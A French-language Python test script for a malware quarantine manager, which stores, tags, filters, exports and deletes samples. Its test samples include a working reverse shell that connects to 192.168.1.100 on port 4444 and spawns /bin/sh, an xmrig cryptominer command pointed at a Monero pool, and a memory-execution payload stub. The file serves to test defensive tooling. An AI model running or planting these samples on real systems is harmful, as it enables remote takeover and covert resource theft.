#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sun Jun 21 10:22:20 2026

@author: hounsousamuel
"""

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Script de test pour le module de quarantaine.
"""

import os
import sys
import json
from datetime import datetime

sys.path.insert(1, os.path.dirname(os.path.abspath(os.path.join(__file__, "..", ".."))))

from sandbox_ia.core.quarantine import QuarantineManager


# =============================================================================
# ÉCHANTILLONS DE TEST
# =============================================================================

REVERSE_SHELL = """#!/usr/bin/env python3
import socket
import subprocess
import os

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.100", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

if __name__ == "__main__":
    reverse_shell()
"""

CRYPTOMINER = """#!/usr/bin/env python3
import requests
import subprocess

config = {
    "url": "stratum+ssl://pool.supportxmr.com:443",
    "user": "4Bk...",
    "pass": "x"
}

subprocess.Popen(["xmrig", "-o", config["url"], "-u", config["user"], "-p", config["pass"]])
"""

FILELESS_PAYLOAD = """#!/usr/bin/env python3
import ctypes
import mmap
import base64

shellcode = base64.b64decode("SGVsbG8gV29ybGQh")
mem = mmap.mmap(-1, len(shellcode), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
mem.write(shellcode)
ctypes.CDLL(None).execve(mem, [], [])
"""

BENIGN_CODE = """#!/usr/bin/env python3
def add(a, b):
    return a + b

if __name__ == "__main__":
    print(f"Résultat: {add(5, 3)}")
"""


# =============================================================================
# RAPPORT SIMULÉ
# =============================================================================

def create_mock_report(score: int, level: str) -> dict:
    """Crée un rapport sandbox simulé."""
    return {
        "session_id": f"test_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
        "final_score": score,
        "final_level": level,
        "alerts_count": 2 if score > 60 else 0,
        "alerts": [
            {
                "timestamp": datetime.now().isoformat(),
                "threat_score": score,
                "threat_level": level,
                "pattern_detected": "reverse_shell" if "socket" in level else "cryptominer",
                "canary_triggered": False,
                "mitre": "T1059.004" if "reverse" in level else "T1496",
                "description": "Pattern détecté"
            }
        ] if score > 60 else [],
        "session_duration": 1.5,
        "timestamp": datetime.now().isoformat(),
        "killed": score >= 80,
        "exec_result": {
            "success": True,
            "exit_code": 0,
            "language": "python",
            "command": "python3 /sandbox/work/sandbox.py",
            "duration": 0.2,
            "timeout_passed": False,
            "stdout": "test output",
            "stderr": ""
        },
        "stats": {"events_processed": 10}
    }


# =============================================================================
# TESTS
# =============================================================================

def test_quarantine():
    """Test complet du module de quarantaine."""
    
    print("\n" + "=" * 70)
    print("🧪 TEST DU MODULE DE QUARANTAINE")
    print("=" * 70)
    
    # ── 1. Initialisation ──────────────────────────────────────────────────────
    print("\n📌 1. Initialisation du gestionnaire")
    qm = QuarantineManager(quarantine_dir="test_quarantine", ttl_days=7)
    print(f"   ✅ Quarantaine créée dans: {qm.quarantine_dir}")
    
    # ── 2. Ajout d'échantillons ──────────────────────────────────────────────
    print("\n📌 2. Ajout d'échantillons en quarantaine")
    
    # 2.1 Reverse shell (CRITICAL)
    item1 = qm.add(
        code=REVERSE_SHELL,
        filename="reverse_shell.py",
        language="python",
        source="email_phishing",
        report=create_mock_report(86, "CRITICAL"),
        tags=["reverse_shell", "c2", "critical"],
        notes="Trouvé dans email de phishing du 21/06/2026"
    )
    print(f"   ✅ Ajouté: {item1.id} ({item1.original_filename}) - CRITICAL")
    
    # 2.2 Cryptominer (HIGH)
    item2 = qm.add(
        code=CRYPTOMINER,
        filename="cryptominer.py",
        language="python",
        source="upload",
        report=create_mock_report(65, "HIGH"),
        tags=["cryptominer", "mining"],
        notes="Uploadé par un utilisateur anonyme"
    )
    print(f"   ✅ Ajouté: {item2.id} ({item2.original_filename}) - HIGH")
    
    # 2.3 Fileless payload (CRITICAL)
    item3 = qm.add(
        code=FILELESS_PAYLOAD,
        filename="fileless.py",
        language="python",
        source="network_capture",
        report=create_mock_report(85, "CRITICAL"),
        tags=["fileless", "injection", "critical"],
        notes="Capturé sur le réseau interne"
    )
    print(f"   ✅ Ajouté: {item3.id} ({item3.original_filename}) - CRITICAL")
    
    # 2.4 Code bénin (LOW)
    item4 = qm.add(
        code=BENIGN_CODE,
        filename="benign.py",
        language="python",
        source="scan_automatique",
        report=create_mock_report(0, "LOW"),
        tags=["benign", "safe"],
        notes="Code bénin détecté lors d'un scan"
    )
    print(f"   ✅ Ajouté: {item4.id} ({item4.original_filename}) - LOW")
    
    # ── 3. Lister les échantillons ────────────────────────────────────────────
    print("\n📌 3. Liste des échantillons en quarantaine")
    
    all_items = qm.qlist()
    print(f"   Total: {len(all_items)} échantillons")
    
    for item in all_items:
        print(f"      - {item.id} | {item.original_filename} | {item.language} | {item.status} | {item.tags}")
    
    # ── 4. Filtrer par statut ─────────────────────────────────────────────────
    print("\n📌 4. Filtrage par statut 'pending'")
    pending = qm.qlist(status="pending")
    print(f"   {len(pending)} échantillons en attente")
    
    # ── 5. Filtrer par tag ────────────────────────────────────────────────────
    print("\n📌 5. Filtrage par tag 'critical'")
    critical_items = qm.qlist(tag="critical")
    print(f"   {len(critical_items)} échantillons marqués 'critical'")
    for item in critical_items:
        print(f"      - {item.id} | {item.original_filename} | score: {item.report.get('final_score') if item.report else 'N/A'}")
    
    # ── 6. Mettre à jour un statut ────────────────────────────────────────────
    print("\n📌 6. Mise à jour du statut")
    item_id = item4.id  # Le code bénin
    qm.update_status(item_id, "released", "Faux positif - code bénin, libéré")
    print(f"   ✅ {item_id} → 'released'")
    
    # ── 7. Ajouter/Supprimer un tag ───────────────────────────────────────────
    print("\n📌 7. Gestion des tags")
    item_id = item2.id  # Le cryptominer
    qm.add_tag(item_id, "blocked")
    print(f"   ✅ Tag 'blocked' ajouté à {item_id}")
    
    qm.remove_tag(item_id, "mining")
    print(f"   ✅ Tag 'mining' retiré de {item_id}")
    
    # ── 8. Récupérer un échantillon spécifique ────────────────────────────────
    print("\n📌 8. Récupération d'un échantillon spécifique")
    item = qm.get(item1.id)
    if item:
        print(f"   ✅ {item.id}:")
        print(f"      - Nom: {item.original_filename}")
        print(f"      - Langage: {item.language}")
        print(f"      - Score: {item.report.get('final_score') if item.report else 'N/A'}")
        print(f"      - Tags: {', '.join(item.tags)}")
        print(f"      - Notes: {item.notes[:80]}...")
    
    # ── 9. Statistiques ──────────────────────────────────────────────────────
    print("\n📌 9. Statistiques de la quarantaine")
    stats = qm.stats()
    print(f"   Total: {stats['total']}")
    print(f"   Par statut: {stats['by_status']}")
    print(f"   Par langage: {stats['by_language']}")
    print(f"   Par tag: {stats['by_tag']}")
    print(f"   Expirés: {stats['expired']}")
    print(f"   TTL: {stats['ttl_days']} jours")
    
    # ── 10. Export ─────────────────────────────────────────────────────────────
    print("\n📌 10. Export des échantillons")
    export_path = "test_quarantine_export.json"
    exported = qm.export(export_path, item_ids=[item1.id, item2.id, item3.id])
    print(f"   ✅ {exported} échantillons exportés vers {export_path}")
    
    # ── 11. Import ─────────────────────────────────────────────────────────────
    print("\n📌 11. Import depuis un export")
    qm2 = QuarantineManager(quarantine_dir="test_quarantine_import", ttl_days=30)
    imported = qm2.import_from(export_path)
    print(f"   ✅ {imported} échantillons importés")
    
    # ── 12. Nettoyage des expirés ─────────────────────────────────────────────
    print("\n📌 12. Nettoyage des échantillons expirés")
    # Modifier la date d'expiration de l'item4 pour qu'il expire
    item4.expiry_date = "2020-01-01T00:00:00"
    qm._save_index()
    cleaned = qm.clean_expired()
    print(f"   ✅ {cleaned} échantillons expirés nettoyés")
    
    # ── 13. Suppression manuelle ──────────────────────────────────────────────
    print("\n📌 13. Suppression manuelle")
    item_id = item4.id
    qm.delete(item_id, remove_files=True)
    print(f"   ✅ {item_id} supprimé")
    
    # ── 14. Statistiques finales ──────────────────────────────────────────────
    print("\n📌 14. Statistiques finales")
    final_stats = qm.stats()
    print(f"   Total restant: {final_stats['total']}")
    
    # ── Résumé ─────────────────────────────────────────────────────────────────
    print("\n" + "=" * 70)
    print("📋 RÉSUMÉ DES TESTS")
    print("=" * 70)
    print(f"   ✅ Quarantaine fonctionnelle")
    print(f"   ✅ {len(all_items)} échantillons ajoutés")
    print(f"   ✅ Tags, statuts, filtres OK")
    print(f"   ✅ Export/Import OK")
    print(f"   ✅ Nettoyage expirés OK")
    print(f"   ✅ Suppression manuelle OK")
    print("\n🎉 TOUS LES TESTS PASSÉS !")
    print("=" * 70)
    
    # ── Affichage final des fichiers créés ────────────────────────────────────
    print("\n📁 Fichiers créés:")
    print(f"   - test_quarantine/")
    print(f"   - test_quarantine_import/")
    print(f"   - {export_path}")
    print("\n💡 Pour nettoyer les fichiers de test:")
    print("   rm -rf test_quarantine test_quarantine_import test_quarantine_export.json")


if __name__ == "__main__":
    test_quarantine()